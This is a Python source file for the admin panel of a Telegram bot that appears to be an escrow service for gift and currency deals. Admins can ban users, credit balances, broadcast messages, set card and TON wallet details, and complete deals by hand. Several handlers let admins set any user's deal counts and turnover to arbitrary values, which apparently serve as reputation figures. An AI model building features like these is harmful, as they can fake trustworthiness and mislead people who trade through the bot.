from aiogram import Router, Bot, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder

from database import Database
from config import ADMIN_IDS
from utils import send_log, fmt_username

router = Router()


def is_admin(tg_id: int) -> bool:
    return tg_id in ADMIN_IDS


class AdminStates(StatesGroup):
    ban_user = State()
    unban_user = State()
    send_money = State()
    send_money_amount = State()
    set_success_deals = State()
    set_success_deals_count = State()
    set_total_deals = State()
    set_total_deals_count = State()
    set_turnover = State()
    set_turnover_amount = State()
    setting_value = State()
    broadcast = State()
    complete_deal_id = State()
    complete_deal_buyer = State()


def admin_main_kb():
    builder = InlineKeyboardBuilder()
    builder.button(text="🚫 Забанить пользователя", callback_data="adm_ban")
    builder.button(text="✅ Разбанить пользователя", callback_data="adm_unban")
    builder.button(text="💰 Отправить деньги", callback_data="adm_money")
    builder.button(text="🏆 Успешные сделки", callback_data="adm_success")
    builder.button(text="📊 Кол-во сделок", callback_data="adm_total")
    builder.button(text="💹 Установить оборот", callback_data="adm_turnover")
    builder.button(text="⚙️ Настройки бота", callback_data="adm_settings")
    builder.button(text="✅ Завершить сделку", callback_data="adm_complete_deal")
    builder.button(text="📢 Рассылка", callback_data="adm_broadcast")
    builder.button(text="📋 Все пользователи", callback_data="adm_users")
    builder.adjust(1)
    return builder.as_markup()


def settings_kb():
    builder = InlineKeyboardBuilder()
    builder.button(text="👤 Поддержка (юз)", callback_data="adm_set_support_username")
    builder.button(text="🌐 Сайт", callback_data="adm_set_website_url")
    builder.button(text="📢 Канал", callback_data="adm_set_channel_url")
    builder.button(text="💳 Номер карты", callback_data="adm_set_card_number")
    builder.button(text="👤 Имя на карте", callback_data="adm_set_card_name")
    builder.button(text="🏦 Банк карты", callback_data="adm_set_card_bank")
    builder.button(text="💎 TON кошелёк", callback_data="adm_set_ton_wallet")
    builder.button(text="📜 Ссылка на условия", callback_data="adm_set_terms_url")
    builder.button(text="🖼 Фото (file_id)", callback_data="adm_set_photo_file_id")
    builder.button(text="🎁 Аккаунт для подарков", callback_data="adm_set_gift_account")
    builder.button(text="📌 Топики логов", callback_data="adm_topics")
    builder.button(text="🔙 Назад", callback_data="adm_main")
    builder.adjust(1)
    return builder.as_markup()


def topics_kb():
    builder = InlineKeyboardBuilder()
    builder.button(text="🆕 Топик: Пользователи", callback_data="adm_set_topic_users")
    builder.button(text="🛡 Топик: Сделки", callback_data="adm_set_topic_deals")
    builder.button(text="💳 Топик: Пополнения", callback_data="adm_set_topic_topups")
    builder.button(text="💸 Топик: Выводы", callback_data="adm_set_topic_withdrawals")
    builder.button(text="📋 Топик: Реквизиты", callback_data="adm_set_topic_requisites")
    builder.button(text="🔧 Топик: Администратор", callback_data="adm_set_topic_admin")
    builder.button(text="📝 Топик: Общее", callback_data="adm_set_topic_general")
    builder.button(text="🔙 Назад", callback_data="adm_settings")
    builder.adjust(1)
    return builder.as_markup()


def back_admin_kb():
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 В админ меню", callback_data="adm_main")
    return builder.as_markup()


SETTING_LABELS = {
    "adm_set_support_username": ("support_username", "👤 Введите юзернейм поддержки (например: @support):"),
    "adm_set_website_url": ("website_url", "🌐 Введите URL сайта:"),
    "adm_set_channel_url": ("channel_url", "📢 Введите URL канала:"),
    "adm_set_card_number": ("card_number", "💳 Введите номер карты/телефона:"),
    "adm_set_card_name": ("card_name", "👤 Введите имя получателя карты:"),
    "adm_set_card_bank": ("card_bank", "🏦 Введите название банка:"),
    "adm_set_ton_wallet": ("ton_wallet", "💎 Введите адрес TON кошелька:"),
    "adm_set_terms_url": ("terms_url", "📜 Введите ссылку на условия использования:"),
    "adm_set_photo_file_id": ("photo_file_id", "🖼 Введите file_id фото для главного меню:"),
    "adm_set_gift_account": ("gift_account", "🎁 Введите юзернейм аккаунта для приёма подарков (например: @PlayerokOTC):"),
    "adm_set_topic_users": ("topic_users", "🆕 Введите ID топика для логов пользователей:"),
    "adm_set_topic_deals": ("topic_deals", "🛡 Введите ID топика для логов сделок:"),
    "adm_set_topic_topups": ("topic_topups", "💳 Введите ID топика для логов пополнений:"),
    "adm_set_topic_withdrawals": ("topic_withdrawals", "💸 Введите ID топика для логов выводов:"),
    "adm_set_topic_requisites": ("topic_requisites", "📋 Введите ID топика для логов реквизитов:"),
    "adm_set_topic_admin": ("topic_admin", "🔧 Введите ID топика для логов администратора:"),
    "adm_set_topic_general": ("topic_general", "📝 Введите ID топика для общих логов:"),
}


@router.message(Command("admin"))
async def admin_panel(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    await state.clear()
    await message.answer(
        "🔧 <b>Панель администратора</b>\n\nВыберите действие:",
        reply_markup=admin_main_kb(),
        parse_mode="HTML",
    )


@router.callback_query(F.data == "adm_main")
async def adm_main(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.clear()
    try:
        await callback.message.edit_text(
            "🔧 <b>Панель администратора</b>\n\nВыберите действие:",
            reply_markup=admin_main_kb(),
            parse_mode="HTML",
        )
    except Exception:
        await callback.message.answer(
            "🔧 <b>Панель администратора</b>\n\nВыберите действие:",
            reply_markup=admin_main_kb(),
            parse_mode="HTML",
        )
    await callback.answer()


@router.callback_query(F.data == "adm_ban")
async def adm_ban(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.ban_user)
    try:
        await callback.message.edit_text(
            "🚫 Введите Telegram ID пользователя для бана:",
            reply_markup=back_admin_kb(),
        )
    except Exception:
        await callback.message.answer(
            "🚫 Введите Telegram ID пользователя для бана:",
            reply_markup=back_admin_kb(),
        )
    await callback.answer()


@router.message(AdminStates.ban_user)
async def process_ban(message: Message, db: Database, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Некорректный ID.", reply_markup=back_admin_kb())
        return
    user = await db.get_user(target_id)
    if not user:
        await message.answer("❌ Пользователь не найден.", reply_markup=back_admin_kb())
        await state.clear()
        return
    await db.ban_user(target_id, 1)
    await state.clear()
    await message.answer(
        f"✅ Пользователь <code>{target_id}</code> (@{user['username']}) заблокирован.",
        reply_markup=back_admin_kb(),
        parse_mode="HTML",
    )
    await send_log(
        bot,
        f"🚫 <b>Пользователь заблокирован</b>\n"
        f"👤 @{user['username']} | ID: <code>{target_id}</code>\n"
        f"🔧 Администратор: {fmt_username(message.from_user.username, message.from_user.id)}",
        topic="admin",
        db=db,
    )
    try:
        await bot.send_message(target_id, "🚫 Вы были заблокированы в боте.")
    except Exception:
        pass


@router.callback_query(F.data == "adm_unban")
async def adm_unban(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.unban_user)
    try:
        await callback.message.edit_text(
            "✅ Введите Telegram ID пользователя для разбана:",
            reply_markup=back_admin_kb(),
        )
    except Exception:
        await callback.message.answer(
            "✅ Введите Telegram ID пользователя для разбана:",
            reply_markup=back_admin_kb(),
        )
    await callback.answer()


@router.message(AdminStates.unban_user)
async def process_unban(message: Message, db: Database, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Некорректный ID.", reply_markup=back_admin_kb())
        return
    user = await db.get_user(target_id)
    if not user:
        await message.answer("❌ Пользователь не найден.", reply_markup=back_admin_kb())
        await state.clear()
        return
    await db.ban_user(target_id, 0)
    await state.clear()
    await message.answer(
        f"✅ Пользователь <code>{target_id}</code> (@{user['username']}) разблокирован.",
        reply_markup=back_admin_kb(),
        parse_mode="HTML",
    )
    await send_log(
        bot,
        f"✅ <b>Пользователь разблокирован</b>\n"
        f"👤 @{user['username']} | ID: <code>{target_id}</code>\n"
        f"🔧 Администратор: {fmt_username(message.from_user.username, message.from_user.id)}",
        topic="admin",
        db=db,
    )
    try:
        await bot.send_message(target_id, "✅ Вы были разблокированы в боте.")
    except Exception:
        pass


@router.callback_query(F.data == "adm_money")
async def adm_money(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.send_money)
    try:
        await callback.message.edit_text(
            "💰 Введите Telegram ID пользователя:",
            reply_markup=back_admin_kb(),
        )
    except Exception:
        await callback.message.answer(
            "💰 Введите Telegram ID пользователя:",
            reply_markup=back_admin_kb(),
        )
    await callback.answer()


@router.message(AdminStates.send_money)
async def process_money_user(message: Message, db: Database, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Некорректный ID.", reply_markup=back_admin_kb())
        return
    user = await db.get_user(target_id)
    if not user:
        await message.answer("❌ Пользователь не найден.", reply_markup=back_admin_kb())
        await state.clear()
        return
    await state.update_data(target_id=target_id, target_username=user["username"])
    await state.set_state(AdminStates.send_money_amount)
    await message.answer(
        f"💰 Пользователь: @{user['username']} (ID: {target_id})\n\nВведите сумму в RUB:"
    )


@router.message(AdminStates.send_money_amount)
async def process_money_amount(message: Message, db: Database, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return
    try:
        amount = float(message.text.replace(",", "."))
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Некорректная сумма.", reply_markup=back_admin_kb())
        return
    data = await state.get_data()
    target_id = data["target_id"]
    target_username = data.get("target_username", "")
    await db.add_balance(target_id, amount)
    await state.clear()
    await message.answer(
        f"✅ Пользователю @{target_username} (ID: {target_id}) начислено {amount} RUB.",
        reply_markup=back_admin_kb(),
    )
    await send_log(
        bot,
        f"💰 <b>Начисление средств</b>\n"
        f"👤 @{target_username} | ID: <code>{target_id}</code>\n"
        f"💵 Сумма: {amount} RUB\n"
        f"🔧 Администратор: {fmt_username(message.from_user.username, message.from_user.id)}",
        topic="admin",
        db=db,
    )
    try:
        await bot.send_message(
            target_id,
            f"✅ Вам начислено {amount} RUB!\n💰 Проверьте свой профиль.",
        )
    except Exception:
        pass


@router.callback_query(F.data == "adm_success")
async def adm_success(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.set_success_deals)
    try:
        await callback.message.edit_text(
            "🏆 Введите Telegram ID пользователя:",
            reply_markup=back_admin_kb(),
        )
    except Exception:
        await callback.message.answer(
            "🏆 Введите Telegram ID пользователя:",
            reply_markup=back_admin_kb(),
        )
    await callback.answer()


@router.message(AdminStates.set_success_deals)
async def process_success_user(message: Message, db: Database, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Некорректный ID.", reply_markup=back_admin_kb())
        return
    user = await db.get_user(target_id)
    if not user:
        await message.answer("❌ Пользователь не найден.", reply_markup=back_admin_kb())
        await state.clear()
        return
    await state.update_data(target_id=target_id, target_username=user["username"])
    await state.set_state(AdminStates.set_success_deals_count)
    await message.answer(
        f"🏆 Пользователь: @{user['username']}\n"
        f"Текущее значение: {user['successful_deals']}\n\n"
        f"Введите новое количество успешных сделок:"
    )


@router.message(AdminStates.set_success_deals_count)
async def process_success_count(message: Message, db: Database, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return
    try:
        count = int(message.text.strip())
        if count < 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Некорректное число.", reply_markup=back_admin_kb())
        return
    data = await state.get_data()
    target_id = data["target_id"]
    target_username = data.get("target_username", "")
    await db.set_successful_deals(target_id, count)
    await state.clear()
    await message.answer(
        f"✅ Успешные сделки @{target_username} установлены: {count}",
        reply_markup=back_admin_kb(),
    )
    await send_log(
        bot,
        f"🏆 <b>Установлены успешные сделки</b>\n"
        f"👤 @{target_username} | ID: <code>{target_id}</code>\n"
        f"📊 Значение: {count}\n"
        f"🔧 Администратор: {fmt_username(message.from_user.username, message.from_user.id)}",
        topic="admin",
        db=db,
    )


@router.callback_query(F.data == "adm_total")
async def adm_total(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.set_total_deals)
    try:
        await callback.message.edit_text(
            "📊 Введите Telegram ID пользователя:",
            reply_markup=back_admin_kb(),
        )
    except Exception:
        await callback.message.answer(
            "📊 Введите Telegram ID пользователя:",
            reply_markup=back_admin_kb(),
        )
    await callback.answer()


@router.message(AdminStates.set_total_deals)
async def process_total_user(message: Message, db: Database, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Некорректный ID.", reply_markup=back_admin_kb())
        return
    user = await db.get_user(target_id)
    if not user:
        await message.answer("❌ Пользователь не найден.", reply_markup=back_admin_kb())
        await state.clear()
        return
    await state.update_data(target_id=target_id, target_username=user["username"])
    await state.set_state(AdminStates.set_total_deals_count)
    await message.answer(
        f"📊 Пользователь: @{user['username']}\n"
        f"Текущее значение: {user['total_deals']}\n\n"
        f"Введите новое общее количество сделок:"
    )


@router.message(AdminStates.set_total_deals_count)
async def process_total_count(message: Message, db: Database, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return
    try:
        count = int(message.text.strip())
        if count < 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Некорректное число.", reply_markup=back_admin_kb())
        return
    data = await state.get_data()
    target_id = data["target_id"]
    target_username = data.get("target_username", "")
    await db.set_total_deals(target_id, count)
    await state.clear()
    await message.answer(
        f"✅ Кол-во сделок @{target_username} установлено: {count}",
        reply_markup=back_admin_kb(),
    )
    await send_log(
        bot,
        f"📊 <b>Установлено кол-во сделок</b>\n"
        f"👤 @{target_username} | ID: <code>{target_id}</code>\n"
        f"📊 Значение: {count}\n"
        f"🔧 Администратор: {fmt_username(message.from_user.username, message.from_user.id)}",
        topic="admin",
        db=db,
    )


@router.callback_query(F.data == "adm_turnover")
async def adm_turnover(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.set_turnover)
    try:
        await callback.message.edit_text(
            "💹 Введите Telegram ID пользователя:",
            reply_markup=back_admin_kb(),
        )
    except Exception:
        await callback.message.answer(
            "💹 Введите Telegram ID пользователя:",
            reply_markup=back_admin_kb(),
        )
    await callback.answer()


@router.message(AdminStates.set_turnover)
async def process_turnover_user(message: Message, db: Database, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Некорректный ID.", reply_markup=back_admin_kb())
        return
    user = await db.get_user(target_id)
    if not user:
        await message.answer("❌ Пользователь не найден.", reply_markup=back_admin_kb())
        await state.clear()
        return
    await state.update_data(target_id=target_id, target_username=user["username"])
    await state.set_state(AdminStates.set_turnover_amount)
    await message.answer(
        f"💹 Пользователь: @{user['username']}\n"
        f"Текущий оборот: {user['turnover']} RUB\n\n"
        f"Введите новый оборот (RUB):"
    )


@router.message(AdminStates.set_turnover_amount)
async def process_turnover_amount(message: Message, db: Database, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return
    try:
        amount = float(message.text.replace(",", "."))
        if amount < 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Некорректная сумма.", reply_markup=back_admin_kb())
        return
    data = await state.get_data()
    target_id = data["target_id"]
    target_username = data.get("target_username", "")
    await db.set_turnover(target_id, amount)
    await state.clear()
    await message.answer(
        f"✅ Оборот @{target_username} установлен: {amount} RUB",
        reply_markup=back_admin_kb(),
    )
    await send_log(
        bot,
        f"💹 <b>Установлен оборот</b>\n"
        f"👤 @{target_username} | ID: <code>{target_id}</code>\n"
        f"💵 Оборот: {amount} RUB\n"
        f"🔧 Администратор: {fmt_username(message.from_user.username, message.from_user.id)}",
        topic="admin",
        db=db,
    )


@router.callback_query(F.data == "adm_settings")
async def adm_settings(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.clear()
    try:
        await callback.message.edit_text(
            "⚙️ <b>Настройки бота</b>\n\nВыберите параметр для изменения:",
            reply_markup=settings_kb(),
            parse_mode="HTML",
        )
    except Exception:
        await callback.message.answer(
            "⚙️ <b>Настройки бота</b>\n\nВыберите параметр для изменения:",
            reply_markup=settings_kb(),
            parse_mode="HTML",
        )
    await callback.answer()


@router.callback_query(F.data == "adm_topics")
async def adm_topics(callback: CallbackQuery, db: Database, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.clear()
    settings = await db.get_all_settings()
    lines = [
        f"🆕 Пользователи: <code>{settings.get('topic_users') or '—'}</code>",
        f"🛡 Сделки: <code>{settings.get('topic_deals') or '—'}</code>",
        f"💳 Пополнения: <code>{settings.get('topic_topups') or '—'}</code>",
        f"💸 Выводы: <code>{settings.get('topic_withdrawals') or '—'}</code>",
        f"📋 Реквизиты: <code>{settings.get('topic_requisites') or '—'}</code>",
        f"🔧 Администратор: <code>{settings.get('topic_admin') or '—'}</code>",
        f"📝 Общее: <code>{settings.get('topic_general') or '—'}</code>",
    ]
    text = (
        "📌 <b>Топики логов</b>\n\n"
        "Укажите ID топика (thread_id) для каждого типа событий.\n"
        "Если топик не задан — лог идёт в общий чат.\n\n"
        + "\n".join(lines)
    )
    try:
        await callback.message.edit_text(text, reply_markup=topics_kb(), parse_mode="HTML")
    except Exception:
        await callback.message.answer(text, reply_markup=topics_kb(), parse_mode="HTML")
    await callback.answer()


@router.callback_query(F.data.startswith("adm_set_"))
async def adm_set_setting(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    cb_data = callback.data
    if cb_data not in SETTING_LABELS:
        await callback.answer()
        return
    setting_key, prompt = SETTING_LABELS[cb_data]
    await state.set_state(AdminStates.setting_value)
    await state.update_data(setting_key=setting_key)
    try:
        await callback.message.edit_text(prompt, reply_markup=back_admin_kb())
    except Exception:
        await callback.message.answer(prompt, reply_markup=back_admin_kb())
    await callback.answer()


@router.message(AdminStates.setting_value)
async def process_setting_value(message: Message, db: Database, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return
    data = await state.get_data()
    setting_key = data.get("setting_key", "")
    value = (message.text or "").strip()
    if not value:
        await message.answer("❌ Пустое значение.", reply_markup=back_admin_kb())
        return
    await db.set_setting(setting_key, value)
    await state.clear()
    await message.answer(
        f"✅ Настройка <b>{setting_key}</b> обновлена:\n<code>{value}</code>",
        reply_markup=back_admin_kb(),
        parse_mode="HTML",
    )
    await send_log(
        bot,
        f"⚙️ <b>Изменена настройка</b>\n"
        f"🔑 Ключ: <code>{setting_key}</code>\n"
        f"📝 Значение: <code>{value}</code>\n"
        f"🔧 Администратор: {fmt_username(message.from_user.username, message.from_user.id)}",
        topic="admin",
        db=db,
    )


@router.callback_query(F.data == "adm_complete_deal")
async def adm_complete_deal(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.complete_deal_id)
    try:
        await callback.message.edit_text(
            "✅ Введите ID сделки для завершения:",
            reply_markup=back_admin_kb(),
        )
    except Exception:
        await callback.message.answer(
            "✅ Введите ID сделки для завершения:",
            reply_markup=back_admin_kb(),
        )
    await callback.answer()


@router.message(AdminStates.complete_deal_id)
async def process_complete_deal_id(message: Message, db: Database, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    deal_id = (message.text or "").strip()
    deal = await db.get_deal(deal_id)
    if not deal:
        await message.answer("❌ Сделка не найдена.", reply_markup=back_admin_kb())
        await state.clear()
        return
    if deal["status"] != "pending":
        await message.answer(
            f"❌ Сделка уже имеет статус: {deal['status']}",
            reply_markup=back_admin_kb(),
        )
        await state.clear()
        return
    await state.update_data(deal_id=deal_id)
    await state.set_state(AdminStates.complete_deal_buyer)
    await message.answer(
        f"✅ Сделка найдена:\n"
        f"💰 {deal['amount']} {deal['currency']}\n"
        f"📜 {deal['gift_links']}\n\n"
        f"Введите Telegram ID покупателя:"
    )


@router.message(AdminStates.complete_deal_buyer)
async def process_complete_deal_buyer(message: Message, db: Database, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return
    try:
        buyer_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Некорректный ID.", reply_markup=back_admin_kb())
        return
    buyer = await db.get_user(buyer_id)
    buyer_username = buyer["username"] if buyer else str(buyer_id)
    data = await state.get_data()
    deal_id = data["deal_id"]
    deal = await db.get_deal(deal_id)
    await db.complete_deal(deal_id, buyer_id, buyer_username)
    await state.clear()
    creator = await db.get_user(deal["creator_id"])
    creator_name = fmt_username(creator["username"] if creator else None, deal["creator_id"])
    await message.answer(
        f"✅ Сделка <code>{deal_id}</code> завершена!\n"
        f"👤 Покупатель: @{buyer_username} (ID: {buyer_id})",
        reply_markup=back_admin_kb(),
        parse_mode="HTML",
    )
    await send_log(
        bot,
        f"✅ <b>Сделка завершена</b>\n"
        f"🔑 ID: <code>{deal_id}</code>\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"📜 Подарки: {deal['gift_links']}\n"
        f"👤 Продавец: {creator_name}\n"
        f"🛍 Покупатель: @{buyer_username} | ID: <code>{buyer_id}</code>\n"
        f"🔧 Завершил: {fmt_username(message.from_user.username, message.from_user.id)}",
        topic="deals",
        db=db,
    )
    try:
        await bot.send_message(
            deal["creator_id"],
            f"✅ Ваша сделка <code>{deal_id}</code> успешно завершена!\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"🛍 Покупатель: @{buyer_username}",
            parse_mode="HTML",
        )
    except Exception:
        pass
    try:
        await bot.send_message(
            buyer_id,
            f"✅ Сделка <code>{deal_id}</code> успешно завершена!\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Продавец: {creator_name}",
            parse_mode="HTML",
        )
    except Exception:
        pass


@router.callback_query(F.data == "adm_broadcast")
async def adm_broadcast(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.broadcast)
    try:
        await callback.message.edit_text(
            "📢 Введите текст рассылки (поддерживается HTML разметка):",
            reply_markup=back_admin_kb(),
        )
    except Exception:
        await callback.message.answer(
            "📢 Введите текст рассылки (поддерживается HTML разметка):",
            reply_markup=back_admin_kb(),
        )
    await callback.answer()


@router.message(AdminStates.broadcast)
async def process_broadcast(message: Message, db: Database, state: FSMContext, bot: Bot):
    if not is_admin(message.from_user.id):
        return
    text = message.text or ""
    if not text:
        await message.answer("❌ Пустое сообщение.", reply_markup=back_admin_kb())
        return
    users = await db.get_all_users()
    sent = 0
    failed = 0
    for user in users:
        if user["is_banned"]:
            continue
        try:
            await bot.send_message(user["tg_id"], text, parse_mode="HTML")
            sent += 1
        except Exception:
            failed += 1
    await state.clear()
    await message.answer(
        f"📢 Рассылка завершена!\n✅ Отправлено: {sent}\n❌ Ошибок: {failed}",
        reply_markup=back_admin_kb(),
    )
    await send_log(
        bot,
        f"📢 <b>Рассылка</b>\n"
        f"✅ Отправлено: {sent} | ❌ Ошибок: {failed}\n"
        f"🔧 Администратор: {fmt_username(message.from_user.username, message.from_user.id)}",
        topic="admin",
        db=db,
    )


@router.callback_query(F.data == "adm_users")
async def adm_users(callback: CallbackQuery, db: Database):
    if not is_admin(callback.from_user.id):
        return
    users = await db.get_all_users()
    total = len(users)
    banned = sum(1 for u in users if u["is_banned"])
    active = total - banned
    text = (
        f"📋 <b>Пользователи бота</b>\n\n"
        f"👥 Всего: {total}\n"
        f"✅ Активных: {active}\n"
        f"🚫 Забанено: {banned}\n\n"
    )
    if total <= 20:
        for u in users:
            status = "🚫" if u["is_banned"] else "✅"
            uname = f"@{u['username']}" if u["username"] else f"ID:{u['tg_id']}"
            text += (
                f"{status} {uname} — сделок: {u['total_deals']}, "
                f"оборот: {u['turnover']} RUB\n"
            )
    try:
        await callback.message.edit_text(text, reply_markup=back_admin_kb(), parse_mode="HTML")
    except Exception:
        await callback.message.answer(text, reply_markup=back_admin_kb(), parse_mode="HTML")
    await callback.answer()
